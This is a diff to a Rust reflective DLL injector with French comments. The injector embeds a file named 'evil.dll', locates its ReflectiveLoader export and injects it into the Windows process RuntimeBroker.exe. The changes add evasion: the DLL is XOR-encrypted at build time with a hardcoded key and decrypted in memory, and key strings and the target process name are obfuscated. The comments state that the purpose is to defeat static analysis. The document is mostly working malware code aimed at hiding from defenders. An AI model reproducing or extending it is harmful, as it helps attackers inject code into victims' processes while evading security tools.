@@ -91,15 +91,27 @@ const PROCESS_VM_WRITE: u32 = 0x0020; // Droit d'écrire dans la mémoire
 const MINIMUM_ACCESS: u32 = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
 
 // ============================================================
-// REFLECTIVE DLL EMBARQUÉE
+// REFLECTIVE DLL EMBARQUÉE (CHIFFRÉE)
 // ============================================================
-// La DLL est compilée avec ReflectiveLdr et embarquée statiquement dans le binaire
-// via include_bytes! (pas de fichier sur disque)
-// evil.dll contient :
-//   - L'export ReflectiveLoader (point d'entrée du loader)
-//   - Le code ReflectiveLdr (se charge lui-même en mémoire)
-//   - DllMain avec la payload (MessageBox, etc.)
-const DLL_BYTES: &[u8] = include_bytes!("../../reflective_dll/evil.dll");
+// La DLL est chiffrée par build.rs avec XOR avant d'être embarquée
+// Cela évite que "ReflectiveLoader" et autres strings apparaissent
+// dans le binaire final lors d'une analyse statique
+
+// DLL chiffrée (générée par build.rs)
+const DLL_BYTES_ENC: &[u8] = include_bytes!("../../reflective_dll/evil.dll.enc");
+
+// Clé XOR - DOIT correspondre à celle dans build.rs
+const XOR_KEY: &[u8] = b"Fr4m3w0rkC2_K3y!"; // 16 bytes
+
+/// Déchiffre la DLL au runtime
+#[inline(always)]
+fn decrypt_dll() -> Vec<u8> {
+    DLL_BYTES_ENC
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ XOR_KEY[i % XOR_KEY.len()])
+        .collect()
+}
 
 // ============================================================
 // STRUCTURES PE (Portable Executable)
@@ -399,8 +411,8 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
                 .to_str()
                 .unwrap_or("");
 
-            // Comparer avec "ReflectiveLoader"
-            if name == "ReflectiveLoader" {
+            // Comparer avec "ReflectiveLoader" (obfusqué)
+            if name == obf_str!("ReflectiveLoader") {
                 debug_println!("[DEBUG] Found ReflectiveLoader at index {}", i);
 
                 // ============================================================
@@ -441,7 +453,7 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
         }
 
         // "ReflectiveLoader" pas trouvé dans la table des exports
-        Err("ReflectiveLoader export not found".to_string())
+        Err(obf_str!("Export not found"))
     }
 }
 
@@ -784,11 +796,16 @@ fn main() {
     );
 
     // =========================================================
+    // ÉTAPE 0: Déchiffrer la DLL au runtime
+    // =========================================================
+    let dll_bytes = decrypt_dll();
+
+    // =========================================================
     // ÉTAPE 1: Parser la DLL pour trouver ReflectiveLoader
     // =========================================================
     debug_println!("[*] Parsing DLL to find ReflectiveLoader export...");
 
-    let loader_offset = match find_reflective_loader_offset(DLL_BYTES) {
+    let loader_offset = match find_reflective_loader_offset(&dll_bytes) {
         Ok(offset) => {
             debug_println!("[+] Found ReflectiveLoader at offset: 0x{:X}", offset);
             offset
@@ -804,7 +821,7 @@ fn main() {
     // =========================================================
     debug_println!("\n[*] Searching for RuntimeBroker.exe...");
 
-    let pid = match find_process_pid("RuntimeBroker.exe") {
+    let pid = match find_process_pid(&obf_str!("RuntimeBroker.exe")) {
         Some(pid) => pid,
         None => {
             debug_eprintln!("[✗] RuntimeBroker.exe not found!");
@@ -818,7 +835,7 @@ fn main() {
     // =========================================================
     // ÉTAPE 3: Injecter la DLL reflective
     // =========================================================
-    match inject_reflective_dll(pid, DLL_BYTES, loader_offset) {
+    match inject_reflective_dll(pid, &dll_bytes, loader_offset) {
         Ok(_) => {
             debug_println!("\n════════════════════════════════════════════");
             debug_println!("[✓] SUCCESS: Reflective DLL injected!");
